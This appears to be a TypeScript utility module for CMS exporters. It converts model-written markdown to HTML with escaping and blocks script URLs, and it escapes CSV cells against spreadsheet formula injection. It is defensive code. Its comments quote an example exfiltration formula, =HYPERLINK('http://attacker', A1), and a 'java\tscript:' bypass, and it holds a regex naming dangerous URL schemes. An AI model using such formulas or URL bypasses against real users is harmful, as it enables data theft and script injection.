// Shared utilities for CMS exporters.

export interface ExportPost {
  id: string;
  title: string;
  slug: string;
  metaTitle: string;
  metaDescription: string;
  primaryKeyword: string;
  draftMarkdown: string;
  schemaJsonLd: string;
  publishDateISO?: string;
  cluster?: string;
  brandName?: string;
  siteUrl?: string;
}

// Drafts come from a model and get pasted into a CMS, so raw HTML in them
// is escaped and a link or image may not carry a script URL.
// Browsers drop tabs, newlines and other control characters while parsing
// a URL, so "java\tscript:" still runs: strip them before checking.
const UNSAFE_SCHEME = /^(javascript|vbscript|data):/i;
const safeUrl = (u: string) => !UNSAFE_SCHEME.test(u.replace(/[\u0000-\u0020\u007f]/g, ""));

export function markdownToHtml(md: string): string {
  // Escaping first also covers link text and attributes: everything the
  // replacements below copy into the output is already escaped.
  // Link and image tags are parked behind \u0000 placeholders until the
  // end, so no later pass (or a link wrapping an image) can rewrite markup
  // inside an attribute.
  const tags: string[] = [];
  const park = (tag: string) => `\u0000${tags.push(tag) - 1}\u0000`;
  let html = xmlEscape(md.replace(/\u0000/g, ""))
    .replace(/(!?)\[([^\]]*)\]\(([^)]+)\)/g, (m, bang: string, text: string, url: string) => {
      if (bang) return safeUrl(url) ? park(`<img src="${url}" alt="${text}">`) : text;
      if (!text) return m;
      return safeUrl(url) ? `${park(`<a href="${url}">`)}${text}</a>` : text;
    })
    .replace(/^#{1}\s+(.+)$/gm, "<h1>$1</h1>")
    .replace(/^#{2}\s+(.+)$/gm, "<h2>$1</h2>")
    .replace(/^#{3}\s+(.+)$/gm, "<h3>$1</h3>")
    .replace(/^#{4}\s+(.+)$/gm, "<h4>$1</h4>")
    .replace(/^- (.+)$/gm, "<li>$1</li>")
    .replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
    .replace(/\*(.+?)\*/g, "<em>$1</em>")
    .replace(/`([^`]+)`/g, "<code>$1</code>");
  html = html.replace(/(<li>[\s\S]*?<\/li>)(?!\n<li>)/g, (m) => `<ul>${m}</ul>`);
  html = html
    .split(/\n\s*\n/)
    .map((p) => (p.trim().startsWith("<") ? p : `<p>${p.trim()}</p>`))
    .join("\n\n");
  return html.replace(/\u0000(\d+)\u0000/g, (_m, i: string) => tags[Number(i)]);
}

export function xmlEscape(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// Cells starting with one of these characters can be interpreted by Excel /
// Google Sheets as formulas — including ones that exfiltrate data
// (e.g. =HYPERLINK("http://attacker", A1)). Prefix-quote to neutralize.
const FORMULA_INJECTION_PREFIX = /^[=+\-@\t\r\n]/;

export function csvEscape(s: string): string {
  if (s == null) return "";
  const safe = FORMULA_INJECTION_PREFIX.test(s) ? "'" + s : s;
  const needs = /[",\n\r]/.test(safe);
  return needs ? `"${safe.replace(/"/g, '""')}"` : safe;
}
